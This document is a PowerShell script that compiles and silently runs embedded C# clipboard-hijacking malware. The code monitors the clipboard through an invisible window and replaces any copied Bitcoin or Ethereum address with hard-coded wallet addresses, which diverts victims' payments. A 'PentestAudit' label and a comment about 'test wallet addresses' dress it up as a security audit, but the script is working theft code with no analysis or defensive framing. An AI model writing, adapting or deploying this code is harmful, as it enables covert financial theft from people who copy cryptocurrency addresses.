$ClipperCode = @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text.RegularExpressions;

namespace PentestAudit {
    public class SilentMonitor : NativeWindow {
        [DllImport("user32.dll")] private static extern bool AddClipboardFormatListener(IntPtr hwnd);
        [DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr hwnd);
        [DllImport("user32.dll")] private static extern bool CloseClipboard();
        [DllImport("user32.dll")] private static extern bool EmptyClipboard();
        [DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint format);
        [DllImport("user32.dll")] private static extern IntPtr SetClipboardData(uint format, IntPtr hMem);
        [DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(IntPtr hMem);
        [DllImport("kernel32.dll")] private static extern IntPtr GlobalAlloc(uint flags, UIntPtr bytes);

        private const uint CF_UNICODETEXT = 13;
        private const uint WM_CLIPBOARDUPDATE = 0x031D;
        
        // Audit Configuration: Replace with your test wallet addresses
        private string btcAddr = "bc1qm4ls7h9jfy2l0u9sfrxjqp3vnfjp6g0cwn64vu";
        private string ethAddr = "0x0b13bE0C7569bd057E924CdAFfA6b20aa6825a93";

        private Regex btcRegex = new Regex(@"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$");
        private Regex ethRegex = new Regex(@"^0x[a-fA-F0-9]{40}$");

        public void Start() {
            this.CreateHandle(new CreateParams()); // Invisible window
            AddClipboardFormatListener(this.Handle);
        }

        protected override void WndProc(ref Message m) {
            if (m.Msg == WM_CLIPBOARDUPDATE) {
                ProcessClipboard();
            }
            base.WndProc(ref m);
        }

        private void ProcessClipboard() {
            if (!OpenClipboard(this.Handle)) return;
            IntPtr hData = GetClipboardData(CF_UNICODETEXT);
            if (hData != IntPtr.Zero) {
                IntPtr ptr = GlobalLock(hData);
                string text = Marshal.PtrToStringUni(ptr);
                GlobalUnlock(hData);
                CloseClipboard();

                string replacement = null;
                if (btcRegex.IsMatch(text.Trim()) && text.Trim() != btcAddr) replacement = btcAddr;
                else if (ethRegex.IsMatch(text.Trim()) && text.Trim() != ethAddr) replacement = ethAddr;

                if (replacement != null) {
                    WriteClipboard(replacement);
                }
            } else {
                CloseClipboard();
            }
        }

        private void WriteClipboard(string text) {
            if (!OpenClipboard(this.Handle)) return;
            EmptyClipboard();
            IntPtr hGlobal = GlobalAlloc(0x0002, (UIntPtr)((text.Length + 1) * 2));
            IntPtr ptr = GlobalLock(hGlobal);
            Marshal.Copy(text.ToCharArray(), 0, ptr, text.Length);
            GlobalUnlock(hGlobal);
            SetClipboardData(CF_UNICODETEXT, hGlobal);
            CloseClipboard();
        }
    }
}
"@

# Compile the C# in memory
Add-Type -TypeDefinition $ClipperCode -ReferencedAssemblies "System.Windows.Forms"

# Start the monitor silently in the background
$Monitor = New-Object PentestAudit.SilentMonitor
$Monitor.Start()

# Keep the PowerShell session alive without showing a window
[System.Windows.Forms.Application]::Run()